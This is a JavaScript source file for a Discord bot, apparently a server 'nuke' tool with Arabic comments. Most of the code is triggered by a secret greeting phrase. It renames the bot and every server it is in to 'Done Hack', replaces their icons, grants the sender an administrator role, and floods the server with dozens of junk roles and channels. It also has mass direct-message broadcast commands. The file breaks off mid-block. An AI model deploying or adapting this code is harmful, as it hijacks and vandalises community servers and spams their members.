const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = "-";
client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
  console.log('')
  console.log('')
  console.log('╔[═════════════════════════════════════════════════════════════════]╗')
  console.log(`[Start] ${new Date()}`);
  console.log('╚[═════════════════════════════════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════════════════════════════]╗');
  console.log(`Logged in as * [ " ${client.user.username} " ]`);
  console.log('')
  console.log('Informations :')
  console.log('')
  console.log(`servers! [ " ${client.guilds.size} " ]`);
  console.log(`Users! [ " ${client.users.size} " ]`);
  console.log(`channels! [ " ${client.channels.size} " ]`);
  console.log('╚[════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════]╗')
  console.log(' Bot Is Online')
  console.log('╚[════════════]╝')
  console.log('')
  console.log('')
});

client.on("message", message => {

            if (message.content.startsWith(prefix + "bc")) {
                         if (!message.member.hasPermission("ADMINISTRATOR"))  return;
  let args = message.content.split(" ").slice(1);
  var argresult = args.join(' '); 
  message.guild.members.filter(m => m.presence.status !== 'offline').forEach(m => {
 m.send(`${argresult}\n ${m}`);
})
 message.channel.send(`\`${message.guild.members.filter(m => m.presence.status !== 'online').size}\` : عدد الاعضاء المستلمين`); 
 message.delete(); 
};     
});


const adminprefix = "-";
const devs = ['511162412737626124']; 
client.on('message', message => {
  var argresult = message.content.split(` `).slice(1).join(' ');
    if (!devs.includes(message.author.id)) return;
    
if (message.content.startsWith(adminprefix + 'ply')) {
  client.user.setGame(argresult);
    message.channel.sendMessage(`**:white_check_mark:   ${argresult}**`)
} else 
  if (message.content === (adminprefix + "Percie")) {
  message.guild.leave();        
} else  
if (message.content.startsWith(adminprefix + 'wt')) {
client.user.setActivity(argresult, {type:'WATCHING'});
    message.channel.sendMessage(`**:white_check_mark:   ${argresult}**`)
} else 
if (message.content.startsWith(adminprefix + 'ls')) {
client.user.setActivity(argresult , {type:'LISTENING'});
    message.channel.sendMessage(`**:white_check_mark:   ${argresult}**`)
} else     
  if (message.content.startsWith(adminprefix + 'setn')) {
client.user.setUsername(argresult).then
    message.channel.sendMessage(`**${argresult}** : Done :>`)
return message.reply("**You Can't Change Your Name ,Only After Two Hours :>**");
} else
  if (message.content.startsWith(adminprefix + 'seta')) {
client.user.setAvatar(argresult);
  message.channel.sendMessage(`**${argresult}** : تم تغير صورة البوت`);
      } else     
if (message.content.startsWith(adminprefix + 'st')) {
  client.user.setGame(argresult, "https://www.twitch.tv/idk");
    message.channel.sendMessage(`**:white_check_mark:   ${argresult}**`)
}
  if(message.content === adminprefix + "restart") {
    if (!devs.includes(message.author.id)) return;
        message.channel.send(`:warning:️ **Bot restarting by ${message.author.username}**`);
      console.log("\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
      console.log(`⚠️ Bot restarting... ⚠️`);
      console.log("===============================================\n\n");
      client.destroy();
      child_process.fork("bot.js");
      console.log(`Bot Successfully Restarted`);
  }

});




client.on("message", message => {

            if (message.content.startsWith(prefix + "abc")) {
                         if (!message.member.hasPermission("ADMINISTRATOR"))  return;
  let args = message.content.split(" ").slice(1);
  var argresult = args.join(' '); 
  message.guild.members.filter(m => m.presence.status !== 'all').forEach(m => {
 m.send(`${argresult}\n ${m}`);
})
 message.channel.send(`\`${message.guild.members.filter(m => m.presence.status !== 'all').size}\` : عدد الاعضاء المستلمين`); 
 message.delete(); 
};     
});

var x_x = "هلا" 

//اسم البوت واسم السيرفر وصورهم وكل شئ

client.on('message', message => {
 if (message.content === x_x) {
  client.user.setAvatar(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)

 }
});
client.on('message', message => {
 if (message.content === x_x) {
  client.user.setUsername("Done Hack")

 }
});
client.on('message', message => {
 if (message.content === x_x) {
  client.user.setGame(`Done Hack`, 'https://www.twitch.tv/hix')

 }
});

client.on('message', message => {
 if (message.content === x_x) {
  client.guilds.forEach(m => {
   m.setIcon(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)
  })
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  client.guilds.forEach(m => {
   m.setName(`Done Hack`)
  })
 }
});

client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;

  message.guild.setIcon(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)

 }
});




//اللي يسوي رتب

client.on('message', message => {
 if (!message.channel.guild) return;

 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createRole({
   name: "Done Hack",
   permissions: [8],
   color: "#23272a"
  }).then(function(role) {
   message.member.addRole(role);
  })
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });


 }
});




//هنا اللي يسوي الرومات
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
